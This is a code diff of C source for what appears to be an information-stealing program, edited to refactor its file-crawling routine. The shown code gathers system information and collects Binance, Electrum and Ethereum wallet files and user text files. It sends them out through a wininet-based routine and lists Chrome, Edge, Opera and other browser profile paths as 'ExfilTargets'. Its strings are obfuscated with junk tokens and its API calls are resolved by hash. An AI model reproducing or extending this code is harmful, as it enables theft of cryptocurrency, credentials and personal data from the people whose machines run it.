@@ -92,14 +92,12 @@ int32_t requestMemoryAllocation(uint32_t bytesToAllocate)
     return 0;
 }
 
-int32_t __fastcall processPath(
-    int32_t sourcePath,
-    PWSTR fileExtension,
-    int32_t searchPath,
-    PWSTR destinationFolder,
-    int32_t recursionDepth,
-    int32_t** SysInfo
-) {
+int32_t __fastcall processPath(PWSTR fileExtension,
+                                int32_t searchPath,
+                                PWSTR destinationFolder,
+                                int32_t recursionDepth,
+                                int32_t** SysInfo)
+{
     int32_t* searchBuffer = malloc(260, 2);
 
     void* getFullPathFunc = ResolveHashes(0x7328f505, u"kernel32.dll");
@@ -267,7 +265,7 @@ ExtractUserData(int brwsrPathOfshit,
             profileInfo[2] = (int32_t)rawFileData;
             profileInfo[1] = (int32_t)formattedProfilePath;
 
-            sub_402345((int)profileInfo, (int)SysInfo);
+            CryptoWallrtsAnd2FA((int)profileInfo, (int)SysInfo);
             free(profileInfo);
 
             ++v8;
@@ -292,35 +290,43 @@ int main(){
   void SysInfo;
 
   allocateMem(1, &SysInfo);
-
   CollectSysInfo(&SysInfo);
+    
   importedFilesPath = (const WCHAR *)GetFilePath((wchar_t *)L"Importedx765ant Fileedx765s/Proedx765file");
   PWSTR* extension = GetFilePath(u"*.edx765txt");
   PWSTR* userprofile = GetFilePath(u"%userproedx765file%");
-  processPath(userprofile, extension, userprofile, importedFilesPath, 2, &SysInfo);
+  processPath(extension, userprofile, importedFilesPath, 2, &SysInfo);
 
   PWSTR walletPathBinance = GetFilePath(L"Walledx765ets/Binanedx765ce");
   PWSTR* extensionBinance = GetFilePath(L"apedx765p-stoedx765re.jsedx765on");
   PWSTR* appDataPathBinance = GetFilePath(L"%appdaedx765ta%/Binaedx765nce");
-  processPath(appDataPathBinance, extensionBinance, appDataPathBinance, walletPathBinance, 1, &SysInfo);
+  processPath(extensionBinance, appDataPathBinance, walletPathBinance, 1, &SysInfo);
 
   PWSTR walletPathElectrum = GetFilePath(L"Walledx765ets/Eleedx765ctrum");
   PWSTR* extensionElectrum = GetFilePath(L"*edx765");
   PWSTR* appDataPathElectrum = GetFilePath(L"%appdedx765ata%/Eledx765ectrum");
-  processPath(appDataPathElectrum, extensionElectrum, appDataPathElectrum, walletPathElectrum, 1, &SysInfo);
+  processPath(extensionElectrum, appDataPathElectrum, walletPathElectrum, 1, &SysInfo);
 
   PWSTR walletPathEthereum = GetFilePath(L"Walledx765ets/Ethedx765ereum");
   PWSTR* extensionEthereum = GetFilePath(L"keystedx765ore");
   PWSTR* appDataPathEthereum = GetFilePath(L"%appdedx765ata%/Etheedx765reum");
-  processPath(appDataPathEthereum, extensionEthereum, appDataPathEthereum, walletPathEthereum, 1, &SysInfo);
+  processPath(extensionEthereum, appDataPathEthereum, walletPathEthereum, 1, &SysInfo);
+
+  /*
+  Binance - Electrum - Ethereum
+  */
   
-    ProcessAndSendData(&SysInfo); // wininet.dll shities 
+  ProcessAndSendData(&SysInfo); // wininet.dll shities 
   
   allocateMem(2, &SysInfo);
   struct {
       PWSTR brwsrOfshit;
       PWSTR brwsrPathOfshit;
   } ExfilTargets[] = {
+    /*
+    Chrome - Chromium - Edge - Kometa - Vivaldi
+    Brave - Opera Stable - Opera GX Stable - Opera Neon
+    */
       {GetFilePath(L"Chredx765ome"), GetFilePath(L"%loedx765calappedx765data%\\Goedx765ogle\\Chredx765ome\\Usedx765er Datedx765a")},
       {GetFilePath(L"Chromiedx765um"), GetFilePath(L"%localappdata%\\Chroedx765mium\\Useedx765r Data")},
       {GetFilePath(L"Ededx765ge"), GetFilePath(L"%localaedx765ppdata%\\Micedx765rosoft\\Edge\\Usedx765er Data")},
